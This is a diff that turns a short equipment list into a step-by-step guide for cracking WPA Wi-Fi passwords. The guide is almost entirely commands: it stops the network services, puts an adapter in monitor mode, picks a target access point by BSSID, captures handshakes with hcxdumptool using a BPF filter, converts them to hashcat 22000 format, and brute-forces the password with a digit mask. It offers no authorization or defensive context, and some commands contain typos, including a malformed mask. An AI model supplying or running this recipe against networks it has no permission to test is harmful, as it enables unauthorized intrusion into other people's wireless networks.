@@ -1,2 +1,22 @@
-ALFA AWUS036NHA
-hashcat
+I assume you have already installed hashcat and the CUDA toolkit, so let start. 
+
+In Kali, sudo systemctl stop NetworkManger.service
+         sudo systemctl stop wpa_supplicant.service
+
+         sudo airmon-ng start wlan0      #NIC is now in monitor mode
+
+This attack will be a targetted one, so we need to know the MAC address of the AP
+         sudo airodump-ng <interface>    #This will show all wireless AP within range,
+                                         select your target. Take note of the MAC address(BSSID)
+                                         and channel(CH), we will need it.
+
+         sudo tcpdump -s 65535 -y IEEE802_11_RADIO "wlan addr3 ************ or wlan addr3 ffffffffffff" -ddd > filename.bpf
+         #The file will be created. 
+
+         sudo hcxdumptool -i <interface> -c <channel(CH)a> --bpf=filename.bpf -w new_filename.pcapng
+
+Now, convert the pcap ng file into a HC 22000 format(newer versions of hashcat)
+         sudo hcxpcapngtool -o hash.hc22000 new_filename.pcapng
+
+Once the file is created, move it to windows to crack with hashcat.
+         hashcat -a 3 -d 1 -m 22000 hash.hc22000 d?d?d?d?d?d?d?d?d?d (you know what type of password)
